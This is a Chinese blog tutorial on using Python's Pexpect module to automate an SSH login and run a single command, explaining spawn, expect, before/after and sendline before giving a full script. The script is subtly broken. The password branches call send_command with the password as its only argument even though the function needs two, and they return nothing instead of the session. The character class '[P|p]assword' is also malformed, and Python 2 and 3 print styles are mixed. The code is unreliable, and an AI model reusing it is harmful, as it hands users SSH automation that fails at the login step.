			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945011027951.html" itemprop="url">
		Python利用Pexpect模拟ssh交互</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<blockquote>
<p><mark>关于Pexpect</mark><br/>
Pexpect 是 Don Libes 的 Expect 语言的一个 Python 实现，是一个用来启动子程序，并使用正则表达式对程序输出做出特定响应，以此实现与其自动交互的 Python 模块。 Pexpect 的使用范围很广，可以用来实现与 ssh、ftp 、telnet 等程序的自动交互；可以用来自动复制软件安装包并在不同机器自动安装；还可以用来实现软件测试中与命令行交互的自动化。</p>
</blockquote>

<h5 id="toc_0">本文利用到的Pexpect的类和方法</h5>

<ol>
<li><p><code>spawn()</code>类:</p>
<pre><code class="language-python">class spawn:
    def __init__(self,command,args=[],timeout=30,maxread=2000,\<br/>
    searchwindowsize=None, logfile=None, cwd=None, env=None)
</code></pre>
<p>spawn是Pexpect模块主要的类，用以实现启动子程序，它有丰富的方法与子程序交互从而实现用户对子程序的控制。它主要使用 pty.fork() 生成子进程，并调用 exec() 系列函数执行 command 参数的内容。</p></li>
<li><p><code>spawn()</code>类中的<code>expect()</code>函数:</p>
<pre><code class="language-python">expect(self, pattern, timeout=-1, searchwindowsize=None)
</code></pre>
<p>在参数中： pattern 可以是正则表达式， pexpect.EOF ， pexpect.TIMEOUT ，或者由这些元素组成的列表。需要注意的是，当 pattern 的类型是一个列表时，且子程序输出结果中不止一个被匹配成功，则匹配返回的结果是缓冲区中最先出现的那个元素，或者是列表中最左边的元素。使用 timeout 可以指定等待结果的超时时间 ，该时间以秒为单位。当超过预订时间时， expect 匹配到pexpect.TIMEOUT。</p></li>
<li><p><code>spawn()</code>类中的<code>before</code>和<code>after</code>属性:</p>
<p>expect 不断从读入缓冲区中匹配目标正则表达式，当匹配结束时 pexpect 的 before 成员中保存了缓冲区中匹配成功处之前的内容， pexpect 的 after 成员保存的是缓冲区中与目标正则表达式相匹配的内容。</p>
<pre><code class="language-python">child = pexpect.spawn(&#39;/bin/ls /&#39;) 
child.expect (pexpect.EOF) <br/>
print child.before
</code></pre>
<p>以上代码就是打印在根目录下面执行ls命令后的输出内容</p></li>
<li><p><code>spawn()</code>类中的send系列函数:</p>
<pre><code class="language-python">send(self, s) 
sendline(self, s=&#39;&#39;) <br/>
sendcontrol(self, char)
</code></pre>
<p>这些方法用来向子程序发送命令，模拟输入命令的行为。 与 send() 不同的是 sendline() 会额外输入一个回车符 ，更加适合用来模拟对子程序进行输入命令的操作。 当需要模拟发送 “Ctrl+c” 的行为时，还可以使用 sendcontrol() 发送控制字符。</p>
<pre><code class="language-python">child.sendcontrol(&#39;c&#39;)
</code></pre></li>
</ol>

<h5 id="toc_1">功能模块分解</h5>

<ol>
<li><p>首先我们需要一个可以单独的session会话，可以由connect函数创建指定host,username和password的会话子进程</p>
<pre><code class="language-text">```Python
PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]<br/>
def createChildSession(host,username,password):<br/>
    command = &#39;ssh &#39;+username+&#39;@&#39;+host<br/>
    child = pexpect.spawn(command)<br/>
    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)<br/>
    if ret == 0:<br/>
        print(&#39;[-] Error Connecting&#39;)<br/>
        return<br/>
    if ret == 1:<br/>
        child.sendline(&#39;yes&#39;)<br/>
        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])<br/>
        if ret == 0:<br/>
            print(&#39;[-] Error Connecting&#39;)<br/>
            return<br/>
        if ret == 1:<br/>
            send_command(password)<br/>
            return<br/>
    if ret == 2:<br/>
        send_command(password)<br/>
        return<br/>
    return child<br/>
```<br/>
利用spawn创建会话之后,利用expect匹配可能存在的返回结果,如果匹配&#39;Are you sure you want to continue connecting&#39; 说明需要确认认证信息，如果直接返回password或者Password`这里利用[p|P]assword正则来匹配`,说明需要输入密码,如果直接是PROMPT中存在的字符，说明直接登录上去了。
</code></pre></li>
<li><p>一个单独的执行命令的函数:</p>
<pre><code class="language-python">def send_command(child,cmd):
    child.sendline(cmd)<br/>
    child.expect(PROMPT)<br/>
    print(child.before)
</code></pre>
<p>一旦通过验证,我们就可以用上面的command函数在ssh会话中发送命令，然后等待命令提示符的出现，最后将命令的执行结果通过child.before打印出来。</p></li>
<li><p>一个包含参数解析的main函数:</p>
<pre><code class="language-python">def main():
    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)<br/>
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)<br/>
    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)<br/>
    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    <br/>
    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)<br/>
    (options,args)=parse.parse_args()<br/>
    host = options.host<br/>
    username = options.username<br/>
    password = options.password<br/>
    command = options.command<br/>
    session = createChildSession(host,username,password)<br/>
    send_command(session,command)
</code></pre>
<p>optparse是一个用来给你的代码添加各种命令参数的库，用其解析出输入的host,username,password已经command,然后调用创建session会话，最后利用send_command向此session发送命令</p></li>
</ol>

<pre><code class="language-bash">tianxianggendeiMac:Python-Study Apple$ python ssh.py -H pi.****.com -u root -p ***** -c pwd
</code></pre>

<p>输出:</p>

<pre><code class="language-bash"> pwd
/root
root@raspberrypi:~
</code></pre>

<h5 id="toc_2">完整代码</h5>

<pre><code class="language-python">#!/usr/bin/python
#-*-coding:utf-8-*-
# date:2016-6-21
# author:root
# 利用pexpect模拟ssh登陆

import pexpect
import optparse

PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]

def send_command(child,cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def createChildSession(host,username,password):
    command = &#39;ssh &#39;+username+&#39;@&#39;+host
    child = pexpect.spawn(command)
    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
    if ret == 0:
        print(&#39;[-] Error Connecting&#39;)
        return
    if ret == 1:
        child.sendline(&#39;yes&#39;)
        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
        if ret == 0:
            print(&#39;[-] Error Connecting&#39;)
            return
        if ret == 1:
            send_command(password)
            return
    if ret == 2:
        send_command(password)
        return
    return child

def main():
    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)

    (options,args)=parse.parse_args()
    host = options.host
    username = options.username
    password = options.password
    command = options.command
    
    session = createChildSession(host,username,password)
    send_command(session,command)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>


			
			
		</div>

	</article>
  

</div>
<nav id="pagenavi">
	 <a class="prev" href="all_5.html">Prev</a>  
	 <a class="next" href="all_7.html">Next</a> 
	<div class="center"><a href="archives.html">Blog Archives</a></div>

</nav>

</div>



        </div>
			<footer id="footer" class="inner">Copyright &copy; 2014
Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a> &nbsp;&nbsp; 
Theme by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
      </footer>
		</div>
	</div>

  
    



</body>
</html>